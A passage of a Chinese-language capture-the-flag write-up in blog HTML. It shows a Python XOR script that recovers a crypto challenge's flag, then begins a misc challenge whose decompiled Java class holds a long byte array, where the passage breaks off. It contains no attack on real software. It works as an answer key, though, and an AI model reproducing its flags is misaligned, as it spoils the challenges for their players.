b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag, key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(flag, new_key)])</span><br><span class="line"></span><br><span class="line">flag = can_encrypt(c, can_encrypt(flag, c))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>解出来cazy{y3_1s_a_h4nds0me_b0y!}</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">🍎 ~/nop/ python3 test.py</span><br><span class="line">b<span class="string">&#x27;cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="Binary-misc"><a href="#Binary-misc" class="headerlink" title="Binary_misc"></a>Binary_misc</h3><p><a href="lemon.zip">题目下载</a></p>
<p>题目下载下来，linux中file查看文件信息，发现是一个class数据文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home]</span><br><span class="line">└─<span class="comment"># file 234</span></span><br><span class="line">234: compiled Java class data, version 52.0 (Java 1.8)</span><br></pre></td></tr></table></figure>

<p>把文件后缀改为class，用idea打开如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] var10000 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span 